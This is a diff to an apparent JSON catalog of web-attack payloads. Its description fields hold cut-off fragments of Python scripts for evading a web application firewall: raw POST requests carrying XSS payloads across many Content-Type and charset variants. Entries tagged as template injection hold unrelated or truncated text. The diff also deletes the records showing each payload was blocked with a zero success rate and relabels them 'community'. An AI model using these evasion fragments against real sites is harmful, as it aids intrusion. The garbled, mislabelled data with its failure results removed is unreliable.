@@ -11,11 +11,7 @@
       "description": "attributeHtml\": \"MARKER_A_XYZ\"},\n                verify=False, timeout=TIMEOUT)\ng_count = r.text.count(\"MARKER_G_XYZ",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "ssti-0002",
@@ -25,11 +21,7 @@
       "description": "globalHtml\": \"{xss}\"}}'.encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/json\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\n# B8: JSON5 / relaxed JSON\nfor xss in [XSS_SHORT]:\n    bodies = [\n        f\"{{globalHtml: '{xss}'}}\",  # unquoted keys\n        f'{{\"globalHtml\": \\'{xss}\\'}}'.encode(),  # single quoted value\n    ]\n\n# B9: Content-Type parameter manipulation\nCT_VARIANTS = [\n    'application/json; charset=utf-8',\n    'application/json; charset=UTF-8',\n    'application/json; charset=utf-16',\n    'application/json; charset=utf-32',\n    'application/json; charset=iso-8859-1',\n    'application/json;charset=utf-8',\n    'APPLICATION/JSON',\n    'application/JSON',\n    'text/json',\n    'text/x-json',\n    'application/vnd.api+json',\n    'application/ld+json',\n    'application/hal+json',\n    'application/json-patch+json',\n    'application/merge-patch+json',\n]\n\nfor ct in CT_VARIANTS:\n    body = json.dumps({\"globalHtml\": XSS_SHORT}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\nprint(f\"  JSON done: {total} total",
       "technique": "encoding",
       "source_file": "waf_round81_waffled.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "ssti-0004",
@@ -39,11 +31,7 @@
       "description": "tmpl-expr",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "ssti-0005",
@@ -53,11 +41,7 @@
       "description": "tmpl-name",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "ssti-0006",
@@ -67,11 +51,7 @@
       "description": "padding\": {\",\".join([\"0",
       "technique": "direct_injection",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "ssti-0007",
@@ -81,11 +61,7 @@
       "description": "charset=utf-16', 'charset=utf-16le', 'charset=utf-16be',\n    'charset=utf-32', 'charset=utf-32le', 'charset=utf-32be',\n    'charset=iso-8859-1', 'charset=windows-1252', 'charset=shift_jis',\n    'charset=euc-jp', 'charset=iso-2022-jp', 'charset=big5',\n    'charset=gb2312', 'charset=gbk', 'charset=euc-kr',\n]\n\nfor cs in CHARSETS_DIFF:\n    for xss in [XSS_S]:\n        enc = urllib.parse.quote(xss, safe='",
       "technique": "direct_injection",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "ssti-0008",
@@ -95,11 +71,7 @@
       "description": "{escaped}",
       "technique": "direct_injection",
       "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     }
   ]
 }
